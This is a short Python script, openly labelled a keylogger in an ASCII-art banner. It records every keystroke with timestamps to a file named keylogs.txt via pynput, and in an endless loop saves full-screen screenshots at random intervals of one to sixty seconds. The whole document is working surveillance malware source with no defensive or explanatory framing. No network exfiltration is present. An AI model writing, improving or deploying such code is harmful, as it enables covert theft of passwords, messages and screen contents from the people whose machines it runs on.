from pynput import keyboard
import logging
from PIL import ImageGrab
import random
import time

print('''
--[[
  _  __         _                         _           ___ _        _    _               
 | |/ /___ _  _| |___ __ _ __ _ ___ _ _  | |__ _  _  / __| |_ _  _| |__| |_  __ _ _ __  
 | ' </ -_| || | / _ / _` / _` / -_| '_| | '_ | || | \__ | ' | || | '_ | ' \/ _` | '  \ 
 |_|\_\___|\_, |_\___\__, \__, \___|_|   |_.__/\_, | |___|_||_\_,_|_.__|_||_\__,_|_|_|_|
           |__/      |___/|___/                |__/                                     
--]]
''')
print("Logging Started....")
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
 level = logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
 logging.info(str(key))
listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    random_time = random.randint(1, 60)
    time.sleep(random_time)
    im = ImageGrab.grab()
    file_name = str(time.time())+".png"
    im.save(file_name)




